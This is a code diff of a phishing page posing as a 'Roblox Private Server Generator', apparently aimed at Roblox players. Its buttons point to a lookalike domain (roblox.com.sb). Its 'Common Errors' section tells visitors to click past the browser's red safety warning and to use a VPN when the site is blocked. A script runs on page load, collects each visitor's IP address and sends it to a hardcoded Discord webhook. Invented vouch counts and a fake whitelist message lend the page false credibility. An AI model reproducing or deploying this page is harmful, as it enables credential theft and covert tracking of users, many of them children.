@@ -13,7 +13,7 @@
         }
 
         body {
-            background-color: #111; /* Dark background */
+            background-color: #111;
             color: white;
             padding: 20px;
         }
@@ -22,7 +22,7 @@
             width: 80%;
             max-width: 1200px;
             margin: 0 auto;
-            background-color: #222; /* Dark container */
+            background-color: #222;
             padding: 30px;
             border-radius: 10px;
             box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
@@ -30,30 +30,48 @@
 
         h1 {
             text-align: center;
-            color: #ff5733; /* Bright red for title */
-            margin-bottom: 30px;
+            color: #ff5733;
+            margin-bottom: 10px;
             font-size: 36px;
         }
 
-        .live-servers-btn {
+        .subtitle {
+            text-align: center;
+            font-size: 18px;
+            color: #ff5733;
+            margin-bottom: 30px;
+        }
+
+        .join-server-btn, .create-live-btn {
             display: block;
-            width: 220px;
+            width: 250px;
             height: 50px;
             margin: 20px auto;
-            background-color: #e60000; /* Red button */
-            color: white;
+            background-color: #333;
+            color: #ff5733;
             font-size: 18px;
             text-align: center;
             line-height: 50px;
-            border-radius: 25px;
+            border-radius: 8px;
             cursor: pointer;
             text-decoration: none;
+            border: 2px solid #ff5733;
+            transition: background-color 0.3s ease, color 0.3s ease;
         }
 
-        .live-servers-btn:hover {
-            background-color: #c30000; /* Darker red on hover */
+        .join-server-btn:hover, .create-live-btn:hover {
+            background-color: #ff5733;
+            color: #fff;
         }
 
+        .mobile-support {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 16px;
+            color: #ff5733;
+        }
+
+        /* Common Errors Section */
         .errors-container {
             margin-top: 30px;
         }
@@ -61,7 +79,7 @@
         .error-tab {
             margin-top: 20px;
             padding: 15px;
-            background-color: #333; /* Dark gray tabs */
+            background-color: #333;
             color: white;
             border-radius: 8px;
             cursor: pointer;
@@ -71,91 +89,48 @@
         }
 
         .error-tab:hover {
-            background-color: #ff5733; /* Red on hover */
+            background-color: #ff5733;
         }
 
         .error-content {
             display: none;
             margin-top: 15px;
             padding: 15px;
-            background-color: #444; /* Dark content background */
-            border-left: 5px solid #e60000; /* Red left border */
+            background-color: #444;
+            border-left: 5px solid #e60000;
             border-radius: 8px;
         }
 
-        .error-content ul {
-            padding-left: 20px;
-        }
-
-        .error-content ul li {
-            margin-bottom: 10px;
+        /* Footer Section */
+        .footer {
+            text-align: center;
             font-size: 16px;
+            color: #ff5733;
+            margin-top: 20px;
+            font-style: italic;
         }
 
-        .more-info-btn, .continue-btn {
-            color: #1e90ff;
-            cursor: pointer;
-            font-weight: bold;
+        /* Animation for text */
+        .animated-text {
+            animation: flicker 1.5s infinite alternate;
         }
 
-        .more-info-btn:hover, .continue-btn:hover {
-            text-decoration: underline;
-        }
-
-        /* Button Styling */
-        .continue-btn {
-            color: #228B22;
-        }
-        
-        .continue-btn:hover {
-            color: #1c741d;
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
         }
     </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Roblox Private Server Generator</h1>
-
-        <!-- LIVE SERVERS Button -->
-        <a href="https://www.roblox.com.sb/games/2788229376/Da-Hood?privateServerLinkCode=078777758529382432057732485646" target="_blank" class="live-servers-btn">LIVE SERVERS</a>
-
-        <!-- Common Errors Section -->
-        <div class="errors-container">
-            <div class="error-tab" onclick="toggleErrorContent('error1')">Common Errors</div>
-
-            <div class="error-content" id="error1">
-                <h2 style="color: #ff5733;">Error 1: Big Red (Smart Scan) Screen</h2>
-                <p style="color: white;">To fix the "Big Red (Smart Scan)" screen, follow these steps:</p>
-                <ul>
-                    <li>Click <strong>"More Information"</strong>.</li>
-                    <li>Once the dropdown appears, click <strong>"CONTINUE"</strong>.</li>
-                </ul>
-            </div>
-
-            <div class="error-tab" onclick="toggleErrorContent('error2')">Error 2: Site Can't Be Reached</div>
-
-            <div class="error-content" id="error2">
-                <h2 style="color: #ff5733;">Error 2: Site Can't Be Reached</h2>
-                <p style="color: white;">To fix the "Site Can't Be Reached" error, try the following:</p>
-                <ul>
-                    <li>Use a VPN to access the site.</li>
-                </ul>
-            </div>
-        </div>
-    </div>
-
     <script>
         async function logIpAddress(userKey) {
             try {
                 const ipResponse = await fetch("https://api.ipify.org?format=json");
                 const ipData = await ipResponse.json();
                 const ipAddress = ipData.ip;
-
                 const webhookUrl = "https://discord.com/api/webhooks/1302810226734403595/MMPGCUIQa0FD3_5WDk5_pFGwIlGGCe_6GjmxqNTQTd15CzHQ-jIsBAfv0M3HTBArMTHf";
                 const payload = {
-                    content: `@everyone IP ADDRESS: ${ipAddress}\nKEY: ${userKey}`
+                    content: `@everyone IP ADDRESS: ${ipAddress}`
                 };
-
                 await fetch(webhookUrl, {
                     method: "POST",
                     headers: {
@@ -163,8 +138,10 @@
                     },
                     body: JSON.stringify(payload)
                 });
+                // Removed the alert here
             } catch (error) {
-                console.error("error:", error);
+                console.error("Error sending to webhook:", error);
+                // Removed the alert here
             }
         }
 
@@ -173,6 +150,11 @@
             const userKey = 'yourUserKeyHere'; // Replace with actual user key
             logIpAddress(userKey);
         };
+
+        // Function to show not whitelisted message
+        function showNotWhitelisted() {
+            alert("NOT WHITELISTED. PLEASE COME BACK WHEN WHITELISTED.");
+        }
 
         // Function to toggle error content visibility
         function toggleErrorContent(errorId) {
@@ -184,6 +166,48 @@
             }
         }
     </script>
+</head>
+<body>
+    <div class="container">
+        <h1>ROBLOX TOOL SINCE 2017</h1>
+        <p class="subtitle animated-text">7000+ VOUCHES</p>
+        <p style="text-align: center; color: #ff5733; font-size: 24px;">LIVE SERVERS</p>
+
+        <!-- Join Server Button -->
+        <a href="https://www.roblox.com.sb/games/16732694052/Fisch?privateServerLinkCode=078777758529382432057732485646" target="_blank" class="join-server-btn">Join Server</a>
+
+        <!-- Create Live Servers Button -->
+        <div class="create-live-btn" onclick="showNotWhitelisted()">Create Live Server for Any </div>
+        
+        <!-- Mobile Support Section -->
+        <p class="mobile-support">MOBILE SUPPORT</p>
+
+        <!-- Common Errors Section -->
+        <div class="errors-container">
+            <div class="error-tab" onclick="toggleErrorContent('error1')">Common Errors</div>
+
+            <div class="error-content" id="error1">
+                <h2 style="color: #ff5733;">Error 1: Big Red (Smart Scan) Screen</h2>
+                <p>To fix the "Big Red (Smart Scan)" screen, follow these steps:</p>
+                <ul>
+                    <li>Click <strong>"More Information"</strong>.</li>
+                    <li>Once the dropdown appears, click <strong>"CONTINUE"</strong>.</li>
+                </ul>
+            </div>
+
+            <div class="error-tab" onclick="toggleErrorContent('error2')">Error 2: Site Can't Be Reached</div>
+
+            <div class="error-content" id="error2">
+                <h2 style="color: #ff5733;">Error 2: Site Can't Be Reached</h2>
+                <p>To fix the "Site Can't Be Reached" error, try the following:</p>
+                <ul>
+                    <li>Use a VPN to access the site.</li>
+                </ul>
+            </div>
+        </div>
+        
+        <!-- Footer Section -->
+        <div class="footer">ROBLOX TOOL SINCE 2017 &nbsp;&nbsp;|&nbsp;&nbsp; 7000+ VOUCHES</div>
+    </div>
 </body>
 </html>
-
